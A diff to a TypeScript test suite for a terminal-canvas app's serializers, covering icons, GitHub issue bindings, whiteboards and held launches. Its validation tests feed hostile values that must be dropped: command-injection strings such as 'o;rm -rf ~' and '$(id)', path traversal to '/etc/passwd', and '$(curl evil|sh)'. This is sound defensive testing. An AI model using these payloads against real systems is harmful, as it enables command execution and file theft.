@@ -8,6 +8,8 @@ import {
   createCodexAccountLoginNode,
   createAgentNode,
   createDinoNode,
+  createWhiteboardNode,
+  duplicateNode,
   createSystemLoginNode,
   isAccountLoginNode,
   fitGroupToChildren,
@@ -664,6 +666,20 @@ describe('node icon serialization', () => {
     expect(nodeStatesToFlow(states)[0].data.icon).toEqual(icon)
   })
 
+  it('round-trips a glyph icon (#291)', () => {
+    const icon = { type: 'lucide', name: 'folder-git' }
+    const states = flowToNodeStates([withIcon(icon)])
+    expect(states[0].icon).toEqual(icon)
+    expect(nodeStatesToFlow(states)[0].data.icon).toEqual(icon)
+  })
+
+  it('drops a glyph outside the allowlist on the way in AND out (#291)', () => {
+    const junk = { type: 'lucide', name: 'not-a-glyph' }
+    expect(flowToNodeStates([withIcon(junk)])[0].icon).toBeUndefined()
+    // eslint-disable-next-line @typescript-eslint/no-explicit-any
+    expect(nodeStatesToFlow([stateWithIcon(junk) as any])[0].data.icon).toBeUndefined()
+  })
+
   it('leaves a node without one undefined, so an untouched canvas serializes as it always did', () => {
     expect(flowToNodeStates([withIcon(undefined)])[0].icon).toBeUndefined()
   })
@@ -685,6 +701,92 @@ describe('node icon serialization', () => {
   it('drops a hostile icon on the way OUT', () => {
     expect(flowToNodeStates([withIcon({ type: 'image', path: '/etc/passwd' })])[0].icon).toBeUndefined()
     expect(flowToNodeStates([withIcon({ type: 'emoji', value: '' })])[0].icon).toBeUndefined()
+  })
+})
+
+describe('issueRef serialization (GitHub issue binding)', () => {
+  const withIssue = (issueRef: unknown): CanvasNode =>
+    ({
+      id: 't1',
+      type: 'terminal',
+      position: { x: 0, y: 0 },
+      width: 320,
+      height: 240,
+      data: { title: 'T', color: '#888', group: null, agentId: 'claude', issueRef }
+    }) as unknown as CanvasNode
+
+  const stateWithIssue = (issueRef: unknown) => ({
+    id: 't1',
+    kind: 'terminal' as const,
+    position: { x: 0, y: 0 },
+    size: { width: 320, height: 240 },
+    title: 'T',
+    color: '#888',
+    group: null,
+    agentId: 'claude',
+    issueRef
+  })
+
+  const ref = { owner: 'eneskirca', repo: 'nodeterm', number: 42 }
+
+  it('round-trips a valid binding', () => {
+    const states = flowToNodeStates([withIssue(ref)])
+    expect(states[0].issueRef).toEqual(ref)
+    expect(nodeStatesToFlow(states)[0].data.issueRef).toEqual(ref)
+  })
+
+  it('keeps a binding whose owner GitHub issued with consecutive or trailing hyphens', () => {
+    // `hello--world` and `john-` are real accounts. A grammar that refused them dropped the
+    // binding on load, and the next save wrote it out of project.json for good.
+    for (const owner of ['hello--world', 'john-']) {
+      const kept = { owner, repo: 'a', number: 1 }
+      const loaded = nodeStatesToFlow([stateWithIssue(kept) as never])
+      expect(loaded[0].data.issueRef).toEqual(kept)
+      expect(flowToNodeStates(loaded)[0].issueRef).toEqual(kept)
+    }
+  })
+
+  it('tolerates its absence: a node saved before the feature hydrates with no binding', () => {
+    // eslint-disable-next-line @typescript-eslint/no-explicit-any
+    const { issueRef: _omit, ...legacy } = stateWithIssue(undefined) as any
+    const flow = nodeStatesToFlow([legacy])
+    expect(flow[0].data.issueRef).toBeUndefined()
+    expect(flow[0].data.agentId).toBe('claude')
+    expect(flowToNodeStates(flow)[0].issueRef).toBeUndefined()
+  })
+
+  // project.json is git-shared: a clone can carry anything here. A malformed binding is DROPPED
+  // (the node survives; only the chip and history go) rather than repaired.
+  it.each([
+    'eneskirca/nodeterm#42',
+    { owner: 'o', repo: 'r' },
+    { owner: 'o', repo: 'r', number: '42' },
+    { owner: 'o;rm -rf ~', repo: 'r', number: 1 },
+    { owner: 'o', repo: 'r`id`', number: 1 },
+    { owner: 'o', repo: '$(id)', number: 1 },
+    { owner: 'o', repo: 'r\nrm', number: 1 },
+    { owner: 'o', repo: 'r', number: 0 }
+  ])('drops a malformed binding %j on the way IN', (bad) => {
+    // eslint-disable-next-line @typescript-eslint/no-explicit-any
+    const flow = nodeStatesToFlow([stateWithIssue(bad) as any])
+    expect(flow[0].data.issueRef).toBeUndefined()
+    expect(flow[0].id).toBe('t1')
+  })
+
+  it('drops a malformed binding on the way OUT', () => {
+    expect(flowToNodeStates([withIssue({ owner: 'o', repo: 'r;x', number: 1 })])[0].issueRef).toBeUndefined()
+  })
+
+  it('a duplicate does not inherit the binding (it is a new session nobody started on the issue)', () => {
+    const copy = duplicateNode(withIssue(ref))
+    expect(copy.id).not.toBe('t1')
+    expect(copy.data.issueRef).toBeUndefined()
+  })
+
+  it('strips unknown keys a hostile file smuggles in beside a valid binding', () => {
+    // eslint-disable-next-line @typescript-eslint/no-explicit-any
+    const flow = nodeStatesToFlow([stateWithIssue({ ...ref, title: '$(curl evil|sh)' }) as any])
+    expect(flow[0].data.issueRef).toEqual(ref)
   })
 })
 
@@ -867,14 +969,14 @@ describe('pendingLaunch round-trip', () => {
     })
   })
 
-  it('stays undefined for an ordinary node', () => {
+  it('retains an ordinary node’s never-attempted command', () => {
     const node = {
       id: 'term-4', type: 'terminal', position: { x: 0, y: 0 }, width: 1, height: 1,
       data: { title: 'T', color: '#888', group: null, initialCommand: 'claude' }
     } as unknown as CanvasNode
     const states = flowToNodeStates([node])
-    expect(states[0].pendingLaunch).toBeUndefined()
-    // initialCommand is still not persisted — arming is what makes a launch durable.
+    expect(states[0].pendingLaunch).toEqual({ after: [], command: 'claude', attempted: false })
+    // The command is persisted as recoverable intent, never as a second initialCommand.
     expect((states[0] as { initialCommand?: string }).initialCommand).toBeUndefined()
   })
 })
@@ -937,6 +1039,16 @@ describe('createCodexAccountLoginNode', () => {
     )
     expect(createCodexAccountLoginNode('acct-2', 0).data.cwd).toBeUndefined()
   })
+
+  it('logs a REMOTE account in on its host with the device flow (the browser callback cannot reach it)', () => {
+    const ssh = { server: { host: 'h', user: 'u' }, remoteCwd: '/srv/app' } as never
+    const node = createCodexAccountLoginNode('acct-2', 0, undefined, '/local/repo', ssh)
+    expect(node.data.initialCommand).toBe('codex login --device-auth')
+    expect(node.data.accountId).toBe('acct-2')
+    expect(node.data.ssh).toBeTruthy()
+    expect(node.data.cwd).toBe('/srv/app')
+    expect(createCodexAccountLoginNode('acct-2', 0).data.initialCommand).toBe('codex login')
+  })
 })
 
 describe('createSystemLoginNode (issue #420)', () => {
@@ -973,6 +1085,47 @@ describe('createSystemLoginNode (issue #420)', () => {
     // trust prompt stood between the click and the OAuth flow.
     expect(createSystemLoginNode(0, undefined, '/work/repo').data.cwd).toBe('/work/repo')
     expect(createSystemLoginNode(0).data.cwd).toBeUndefined()
+  })
+})
+
+describe('whiteboard node serialization', () => {
+  const board = (data: Record<string, unknown> = {}): CanvasNode =>
+    ({
+      id: 'whiteboard-1',
+      type: 'whiteboard',
+      position: { x: 10, y: 20 },
+      width: 900,
+      height: 600,
+      data: { title: 'Board', color: '#64d2ff', group: null, ...data }
+    }) as unknown as CanvasNode
+
+  it('round-trips whiteboardSource and boardRev through both serializers', () => {
+    const states = flowToNodeStates([board({ whiteboardSource: 'whiteboard-orig', boardRev: 1729000000000 })])
+    expect(states[0]).toMatchObject({ kind: 'whiteboard', whiteboardSource: 'whiteboard-orig', boardRev: 1729000000000 })
+    const back = nodeStatesToFlow(states)
+    expect(back[0].type).toBe('whiteboard')
+    expect(back[0].data).toMatchObject({ whiteboardSource: 'whiteboard-orig', boardRev: 1729000000000 })
+  })
+
+  it('drops a whiteboardSource from project.json that is not a plain node id (the core reads files by it)', () => {
+    const states = flowToNodeStates([board()])
+    for (const bad of ['../../etc/passwd', 'a/b', '..', 42]) {
+      const back = nodeStatesToFlow([{ ...states[0], whiteboardSource: bad as string }])
+      expect(back[0].data.whiteboardSource).toBeUndefined()
+    }
+  })
+
+  it('never saves autoEdit — it only opens a board the moment it is created', () => {
+    expect(createWhiteboardNode(0).data.autoEdit).toBe(true)
+    expect(flowToNodeStates([board({ autoEdit: true })])[0]).not.toHaveProperty('autoEdit')
+  })
+
+  it('a duplicate reads the original board by id and gets a whiteboard id, not a terminal one', () => {
+    const copy = duplicateNode(board())
+    expect(copy.id).toMatch(/^whiteboard-/)
+    expect(copy.data.whiteboardSource).toBe('whiteboard-1')
+    // A copy of a copy still points at the board that actually has the drawing.
+    expect(duplicateNode(board({ whiteboardSource: 'whiteboard-orig' })).data.whiteboardSource).toBe('whiteboard-orig')
   })
 })
 
@@ -1077,5 +1230,72 @@ describe('createAgentNode prompt injection', () => {
   it('keeps argv injection byte-identical for codex and gemini', () => {
     expect(createAgentNode('codex', 0, undefined, undefined, 'do X').data.initialCommand).toBe("codex 'do X'")
     expect(createAgentNode('gemini', 0, undefined, undefined, 'do X').data.initialCommand).toBe("gemini 'do X'")
+  })
+})
+
+describe('pendingLaunch at the serializer seams (a held launch is hostile input too)', () => {
+  const state = (pendingLaunch: unknown) =>
+    ({
+      id: 'a1',
+      kind: 'terminal' as const,
+      position: { x: 0, y: 0 },
+      size: { width: 320, height: 240 },
+      title: 'A',
+      color: '#888',
+      group: null,
+      agentId: 'claude',
+      pendingLaunch
+    }) as never
+  const live = (pendingLaunch: unknown): CanvasNode =>
+    ({
+      id: 'a1',
+      type: 'terminal',
+      position: { x: 0, y: 0 },
+      width: 320,
+      height: 240,
+      data: { title: 'A', color: '#888', group: null, agentId: 'claude', pendingLaunch }
+    }) as unknown as CanvasNode
+
+  it('round-trips a PR-held launch', () => {
+    const hold = {
+      after: ['b1'],
+      command: 'claude',
+      attempted: false,
+      afterPr: { repository: 'o/r', waits: [{ number: 7, until: 'checks' }], deadlineAt: 5, armedAt: 1 }
+    }
+    const flow = nodeStatesToFlow([state(hold)])
+    expect(flow[0].data.pendingLaunch).toEqual(hold)
+    expect(flowToNodeStates(flow)[0].pendingLaunch).toEqual(hold)
+  })
+
+  it('an `after` that is not a list loads as a MANUAL hold — the launch loop would throw on it', () => {
+    const flow = nodeStatesToFlow([state({ after: 'b1', command: 'claude' })])
+    expect(flow[0].data.pendingLaunch).toMatchObject({ after: [], manualOnly: true })
+  })
+
+  it('round-trips a success-held launch (--after-success)', () => {
+    const hold = {
+      after: ['b1'],
+      command: 'claude',
+      attempted: false,
+      afterSuccess: { deps: ['b1'], deadlineAt: 5 }
+    }
+    const flow = nodeStatesToFlow([state(hold)])
+    expect(flow[0].data.pendingLaunch).toEqual(hold)
+    expect(flowToNodeStates(flow)[0].pendingLaunch).toEqual(hold)
+  })
+
+  it('a malformed success wait loads as the invalid hold, on the way in and on the way out', () => {
+    const flow = nodeStatesToFlow([state({ after: ['b1'], command: 'c', afterSuccess: { deps: 'b1' } })])
+    expect((flow[0].data.pendingLaunch as { afterSuccess?: { invalid?: true } }).afterSuccess?.invalid).toBe(true)
+    const out = flowToNodeStates([live({ after: [], command: 'c', afterSuccess: ['b1'] })])
+    expect(out[0].pendingLaunch?.afterSuccess?.invalid).toBe(true)
+  })
+
+  it('a malformed PR wait loads as the invalid hold, on the way in and on the way out', () => {
+    const flow = nodeStatesToFlow([state({ after: [], command: 'c', afterPr: { waits: 'all' } })])
+    expect((flow[0].data.pendingLaunch as { afterPr?: { invalid?: true } }).afterPr?.invalid).toBe(true)
+    const out = flowToNodeStates([live({ after: [], command: 'c', afterPr: 'soon' })])
+    expect(out[0].pendingLaunch?.afterPr?.invalid).toBe(true)
   })
 })
